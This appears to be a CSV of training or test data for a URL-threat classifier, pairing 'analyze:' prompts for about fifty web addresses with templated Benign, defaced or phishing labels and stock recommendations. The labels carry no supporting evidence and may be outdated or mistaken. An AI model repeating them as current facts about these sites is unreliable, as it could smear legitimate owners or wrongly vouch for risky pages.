input_text,target_text
analyze: http://extratorrent.cc/torrent/4191180/The+Rage.Carrie.2.1999.480p.BluRay.x264.mSD.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: facebook.com/pages/The-Harold-Greenberg-Fund/100946925766,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: downtownmusicgallery.com/Main/news/pre46.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: docsouth.unc.edu/church/texts.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: pne-online.net/forum/showthread.php?7947-1960-61-Football-League-Division-One,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://nguyentandung.org/usda-post-du-bao-gao-viet-nam-dat-67-trieu-tan-xuat-khau.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: loot.co.za/index/html/index2808.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: democrats.org/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wcliberty.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://applicationforschengenvisa.com/schengen-visum-for-cyprus?format=pdf,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.afotiadis.gr/index.php/el/component/mailto/index.html?tmpl=component&link=7f25cf5bf84695b6133e725c31d7261955dd4189,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: classmates.com/directory/public/memberprofile/list.htm?regId=283883681,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://shiloinc.com/index.php?option=com_content&view=article&id=191&Itemid=233,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.e-wings.com.cn/images/index.htm?app=com-d3&amp;us.battle.net/login/en/?ref=us.battle.net/d3/en/index,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: imdb.com/name/nm1819855/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: last.fm/music/Greenthink,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: uk.ask.com/wiki/Category:Canadian_film_actors,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: hiphopextra.com/2011/05/tiffany-graces-debut-album-naked-singularity/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.photoremote.de/kompatibilitaetsliste,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: youtube.com/watch?v=QUKnVDiFtNA,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: firstcommercialbank.com/index.cfm?ID=447,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: worldofquotes.com/author/Lily-Dougall/1/index.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: flixster.com/actor/leland-l-jones,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: duchess-theduchess.blogspot.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: connect.in.com/wwe-elimination-chamber-2011-videos/blog/watch-wwe-elimination-chamber-2011-live-streaming-replay-video--94f8b52104ff5a0f0af6d7e6af6debe1557f9271.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: pipl.com/directory/people/Donald/Deke,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: facebook.com/coreyhartofficial?sk=info,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: alacrastore.com/company-snapshot/Dorel_Industries_Inc-1028644,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: hockeygoalies.org/bio/giguere.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.kumarantemple.org.au/sejeal.jpg,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://hollywoodlife.com/2015/01/15/miley-cyrus-masturbating-photo-haters-instagram/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: nme.com/awards/video/id/CwglDZ_bdu0/search/trumpet+and+ogran,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: kithfan.org/kith/kevin.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: jasonthelenshop.com,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: http://www.rsccaritas.ie/x.txt,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.banneton.com.au/index.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://gingerbreadhausbakery.com/pastries-and-cakes,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: infotechmedia.com,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: spoke.com/info/c3wYfu2/HeinzNorthAmerica,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: diocese-kcsj.org/news/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: 4online.tv/vrak-tv/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: kqed.org/quest/television/profile-sylvia-earle,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: icelebz.com/celebs/debbe_dunning/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: steelfactory.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: brigitte-bako-nude.pic-celebrity.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: hawen.io,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: http://www.jnpiraq.net/arabic/index.php?option=com_content&view=article&id=691:2010-09-16-07-16-54&catid=5:2009-02-14-18-16-26&Itemid=10,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
